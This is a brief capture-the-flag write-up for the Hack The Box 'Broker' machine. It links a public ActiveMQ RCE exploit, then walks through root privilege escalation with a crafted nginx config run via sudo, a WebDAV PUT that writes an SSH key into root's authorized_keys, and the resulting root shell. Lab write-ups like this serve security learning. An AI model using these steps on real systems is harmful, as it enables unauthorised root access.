# Broker Htb writeup

## User

1. Activemq RCE CVE-2023-46604

https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ

## Root

1. Sudo Privilleges

```
activemq@broker:/tmp$ sudo -l
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

create malicions nginx conf file

pwn.conf

```
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
	worker_connections 768;
}
http {
	server {
		listen 1234;
		root /;
		autoindex on;

		dav_methods PUT;
	}
}
``` 

sudo nginx -c /tmp/pwn.conf

Then verify the configurations runs.

ss -tlpn

then create ssh keys move it to root's ssh authorized keys 

```
activemq@broker:/home/activemq$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/activemq/.ssh/id_rsa): ./root
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ./root
Your public key has been saved in ./root.pub
The key fingerprint is:
SHA256:YO0uGn2CT9MQ9XXf63eQjriz+660PO8FmmR94MbO4+I activemq@broker
The key's randomart image is:
+---[RSA 3072]----+
|        .   . .  |
|       o . . . ..|
|      + . . .   o|
|     . +   + . ..|
|      . S o * +. |
|     o + o B =.. |
|    o * + = = o.o|
|     = = o++ o  o|
|    . .  .E%*    |
+----[SHA256]-----+

```

activemq@broker:/tmp$ curl -X PUT localhost:1234/root/.ssh/authorized_keys -d "$(cat root.pub)"

```bash
activemq@broker:/tmp$ ssh -i root root@localhost
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Dec  1 05:59:56 PM UTC 2023

  System load:           0.009765625
  Usage of /:            73.6% of 4.63GB
  Memory usage:          23%
  Swap usage:            0%
  Processes:             212
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.243
  IPv6 address for eth0: dead:beef::250:56ff:feb9:2b9


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Dec  1 17:51:08 2023 from 127.0.0.1
root@broker:~# whoami
root

```